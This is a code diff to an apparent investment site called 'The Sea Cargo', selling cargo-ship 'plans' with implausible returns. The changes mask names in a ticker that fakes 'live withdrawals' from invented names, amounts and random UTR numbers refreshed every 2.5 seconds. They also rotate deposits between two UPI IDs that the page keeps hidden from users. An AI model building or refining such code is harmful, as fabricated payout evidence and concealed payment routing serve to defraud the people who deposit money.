@@ -126,7 +126,7 @@
         <main class="p-3.5 space-y-4">
       <!-- SECTION: HOMEPAGE -->
       <section id="sec-home" class="space-y-4">
-        <!-- CONTINUOUSLY AUTO-ROTATING LIVE WITHDRAWALS -->
+        <!-- CONTINUOUSLY AUTO-ROTATING MASKED LIVE WITHDRAWALS -->
         <div class="bg-[#080d1a] border border-white/10 rounded-2xl p-3 shadow-lg">
           <div class="flex justify-between items-center mb-2 px-1">
             <span class="text-xs font-black text-white flex items-center gap-1.5">
@@ -137,7 +137,7 @@
             </span>
           </div>
           <div id="liveWithdrawTicker" class="space-y-1.5 text-xs min-h-[92px]">
-            <!-- JS dynamically changes these continuously -->
+            <!-- JS dynamically changes these every 2.5s with masked names -->
           </div>
         </div>
 
@@ -163,7 +163,7 @@
           <span class="text-[10px] font-bold text-orange-400 bg-orange-500/10 border border-orange-500/20 px-2 py-0.5 rounded-md">8 Plans Active</span>
         </div>
 
-        <!-- 2x2 PLANS GRID: PLANS 1 TO 4 -->
+        <!-- 2x2 PLANS GRID: PLANS 1 TO 4 WITH EXACT SHIP IMAGES -->
         <div class="grid grid-cols-2 gap-3">
           <!-- PLAN 1 -->
           <div class="plan-card flex flex-col justify-between">
@@ -293,7 +293,7 @@
             </div>
           </div>
         </div>
-                <!-- 2x2 PLANS GRID: PLANS 5 TO 8 -->
+                <!-- 2x2 PLANS GRID: PLANS 5 TO 8 WITH EXACT SHIP IMAGES -->
         <div class="grid grid-cols-2 gap-3 mt-3">
           <!-- PLAN 5 -->
           <div class="plan-card flex flex-col justify-between">
@@ -719,7 +719,7 @@
 
   <!-- ================= 3. POPUP MODALS ================= -->
 
-  <!-- RECHARGE / DEPOSIT MODAL WITH PROMINENT REALISTIC UPI ICONS (NO QR & NO RAW TEXT UPI ID) -->
+  <!-- RECHARGE / DEPOSIT MODAL WITH REALISTIC UPI APPS (NO RAW TEXT UPI ID) -->
   <div id="rechargeModal" class="hidden fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
     <div class="bg-[#080d1a] border border-orange-500/30 rounded-3xl p-5 w-full max-w-sm space-y-4 max-h-[90vh] overflow-y-auto shadow-2xl">
       <div class="flex justify-between items-center border-b border-white/10 pb-3">
@@ -905,12 +905,22 @@
       { id: 8, planNo: "Plan 8", title: "Container Liner", price: 2500, daily: 2500, total: 25000 }
     ];
 
-    // CONTINUOUS ROTATING LIVE WITHDRAWALS ENGINE (NAMES & UTR CHANGE CONSTANTLY)
-    const withdrawalPool = [
-      "Sanjay Gupta", "Deepak Verma", "Manoj Singh", "Rajesh Kumar", 
-      "Vikram Rathore", "Aman Dubey", "Pooja Sharma", "Rohit Pandey",
-      "Suresh Patel", "Ankit Tiwari", "Vijay Jadhav", "Karan Malhotra",
-      "Arjun Nair", "Preeti Mishra", "Rahul Chauhan", "Harish Rao"
+    // DUAL DYNAMIC ROTATING UPI IDS (Background Rotation without revealing raw ID on UI)
+    const UPI_IDS = ["thesolarinvest1@ybl", "thecargo@slc"];
+    let upiRotateIndex = 0;
+
+    function getActiveUpiId() {
+      const selectedVpa = UPI_IDS[upiRotateIndex];
+      upiRotateIndex = (upiRotateIndex + 1) % UPI_IDS.length;
+      return selectedVpa;
+    }
+
+    // CONTINUOUS ROTATING MASKED LIVE WITHDRAWALS ENGINE
+    // Format: First letter + asterisks + last letter (e.g. R*****h, V*****m)
+    const maskedNames = [
+      "R*****h", "V*****m", "A***y", "S*****a", "D****k", 
+      "M***j", "P***a", "R***t", "S****h", "A***t", 
+      "V***y", "K***n", "A***n", "P****i", "R***l"
     ];
     const amountPool = [1200, 1850, 2400, 3100, 3500, 4200, 4800, 5200, 6500, 7500, 9200, 11500];
 
@@ -921,30 +931,30 @@
 
       let html = "";
       for (let i = 0; i < 3; i++) {
-        const nameIdx = (currentIndex + i) % withdrawalPool.length;
+        const nameIdx = (currentIndex + i) % maskedNames.length;
         const amtIdx = (currentIndex + i * 2) % amountPool.length;
-        const name = withdrawalPool[nameIdx];
+        const name = maskedNames[nameIdx];
         const amt = amountPool[amtIdx];
         const randomUTR = Math.floor(100000 + Math.random() * 900000);
         
         html += `
           <div class="flex justify-between items-center bg-[#030712] p-2 rounded-xl border border-white/5 fade-item">
-            <span class="text-gray-300 font-semibold">${name}</span>
+            <span class="text-gray-300 font-semibold font-mono tracking-wider">${name}</span>
             <span class="text-[#00f589] font-black font-mono">₹${amt}.00</span>
             <span class="text-[9px] text-gray-500 font-mono">UTR: ${randomUTR}***</span>
           </div>
         `;
       }
       ticker.innerHTML = html;
-      currentIndex = (currentIndex + 1) % withdrawalPool.length;
+      currentIndex = (currentIndex + 1) % maskedNames.length;
     }
 
-    // DIRECT APP-SPECIFIC UPI INTENT LAUNCHER
+    // DIRECT APP-SPECIFIC UPI INTENT LAUNCHER WITH DUAL UPI ROTATION
     function launchUpi(app) {
       const amtInput = document.getElementById("depAmount");
       const amount = (amtInput && amtInput.value) ? parseFloat(amtInput.value).toFixed(2) : "350.00";
       
-      const vpa = "thesolarinvest1@ybl";
+      const vpa = getActiveUpiId();
       const name = encodeURIComponent("The Sea Cargo");
       const note = encodeURIComponent("Cargo Container Capital");
       const currency = "INR";
@@ -971,7 +981,7 @@
 
       window.location.href = appUrl;
 
-      // Fallback
+      // Fallback intent
       setTimeout(() => {
         window.location.href = `upi://pay?${upiParams}`;
       }, 700);
@@ -1207,7 +1217,7 @@
     // Initialization
     window.addEventListener("DOMContentLoaded", () => {
       updateLiveWithdrawals();
-      setInterval(updateLiveWithdrawals, 2500); // Dynamic real-time change every 2.5 seconds
+      setInterval(updateLiveWithdrawals, 2500); // Continuous masked rotation every 2.5s
     });
   </script>
 </body>
